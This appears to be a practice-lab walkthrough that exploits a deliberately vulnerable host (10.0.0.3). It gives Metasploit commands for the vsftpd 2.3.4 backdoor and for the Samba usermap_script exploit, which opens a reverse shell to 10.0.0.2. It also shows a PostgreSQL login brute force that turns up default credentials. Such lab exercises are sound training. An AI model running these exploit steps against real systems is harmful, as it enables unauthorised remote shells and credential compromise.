Port 21 vsftpd

<details>
<summary>Solution</summary>

```markdown
search vsftpd
```



The output of the search is: 



```markdown
Matching Modules

================

Name                                  Disclosure Date  Rank    Description

----                                  ---------------  ----    -----------

exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

Now to the exploitation:

```markdown
use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 10.0.0.3

set payload cmd/unix/interact

exploit

```

To verify if the exploit worked use 
```markdown
whoami
```
</details>

Port 445 samba

<details>
<summary>Solution</summary>

```markdown
use auxiliary/scanner/smb/smb_version

set RHOSTS 10.0.0.3

run
```

With the information we now have we can use:

```markdown
use exploit/multi/samba/usermap_script

set RHOSTS 10.0.0.3

set payload cmd/unix/reverse

set LHOST 10.0.0.2

set RPORT 445

exploit
```

To verify our access: 

```markdown
whoami
```

</details>

Port 5432 PostgreSQL


<details>
<summary>Solution</summary>

First we brute force the password:

```markdown
use auxiliary/scanner/postgres/postgres_login

set RHOSTS 10.0.0.3

set STOP_ON_SUCCESS true

run
```

The result of the brute force attack:

```markdown
Success: postgres:postgres (Database 'template1' succeeded.)
```
</details>